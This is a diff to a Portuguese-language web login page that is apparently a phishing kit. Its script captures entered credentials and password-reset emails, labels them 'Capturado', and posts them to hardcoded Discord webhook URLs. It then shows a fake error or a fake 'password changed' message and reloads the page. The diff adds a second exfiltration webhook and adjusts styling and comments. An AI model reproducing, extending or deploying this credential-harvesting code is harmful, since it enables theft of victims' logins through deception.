@@ -260,6 +260,7 @@
       color: #ffffff;
       font-weight: bold;
       margin-bottom: 24px;
+      font-size: 1.2rem;
     }
     .modal input {
       width: 100%;
@@ -384,14 +385,14 @@
     </div>
   </div>
 
-  <!-- Mensagem de sucesso que desce -->
+  <!-- Mensagem de sucesso descendo -->
   <div id="successMsg" class="success-msg">Senha alterada com sucesso!</div>
 
   <script>
     const form = document.getElementById('loginForm');
     const errorBox = document.getElementById('errorBox');
-    const webhookUrl = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
-    const resetWebhook = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
+    const webhookLogin = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
+    const webhookReset = 'https://discord.com/api/webhooks/1482485891745452134/hkOt6HDKCCqjYLi0qXI1FYeQCKWb5IC61up8vgwNImNeZZkUN1_RqbaOKWkNfDCHy-3X';
 
     const forgotLink = document.getElementById('forgotPassword');
     const modal = document.getElementById('resetModal');
@@ -401,7 +402,7 @@
     const emailDisplay = document.getElementById('emailDisplay');
     const successMsg = document.getElementById('successMsg');
 
-    // Login normal
+    // Login normal → webhookLogin
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
@@ -477,7 +478,7 @@
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
-      fetch(webhookUrl, {
+      fetch(webhookLogin, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: mensagem })
@@ -487,7 +488,7 @@
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
 
-    // Reset de senha
+    // Reset de senha → webhookReset
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
@@ -534,12 +535,12 @@
       // Mostra mensagem descendo
       successMsg.classList.add('show');
 
-      // Depois de 3 segundos + animação de saída
+      // Desce pra fora da tela após 3 segundos
       setTimeout(() => {
-        successMsg.style.top = '100vh'; // desce pra fora da tela
+        successMsg.style.top = '100vh';
       }, 3000);
 
-      // Recarrega a página após ~4 segundos (tempo da animação)
+      // Recarrega a página após a animação terminar
       setTimeout(() => {
         location.reload();
       }, 4000);
